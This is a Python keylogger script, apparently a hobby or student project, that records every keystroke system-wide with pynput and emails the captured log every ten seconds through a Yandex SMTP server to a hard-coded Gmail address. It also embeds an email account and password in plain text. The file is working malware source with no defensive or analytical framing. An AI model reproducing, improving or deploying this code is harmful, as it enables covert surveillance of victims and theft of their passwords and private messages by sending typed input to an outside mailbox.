import sys
import threading
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
import pynput.keyboard
import smtplib

log = ""

def callbackFunc(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += str(key)

def sendEmail(email, password, message):
    try:
        emailServer = smtplib.SMTP_SSL("smtp.yandex.com", 465)
        emailServer.login(email, password)
        emailServer.sendmail(email, "ahmetzincir27@gmail.com", message)
        emailServer.quit()
    except Exception as e:
        print("Email gönderme hatası:", e)

def threadFunc():
    global log
    sendEmail("drewbarrymore34@yandex.com", "edncntkucviklakx", log)
    log = ""
    timerObj = threading.Timer(10, threadFunc)
    timerObj.start()

keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunc)

def main():
    app = QApplication(sys.argv)
    window = QMainWindow()
    window.setGeometry(100, 100, 400, 250)
    window.setWindowTitle("MyKeylogger")

    text_edit = QTextEdit(window)
    text_edit.move(50, 50)
    text_edit.resize(300, 150)
    text_edit.setEnabled(False)
    text_edit.setStyleSheet("color: red;")
    text_edit.setPlainText(log)

    search_edit = QLineEdit(window)
    search_edit.move(50, 20)
    search_edit.resize(300, 20)
    search_edit.setStyleSheet("color: blue;")

    window.show()

    keyloggerListener.start()
    threadFunc()

    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
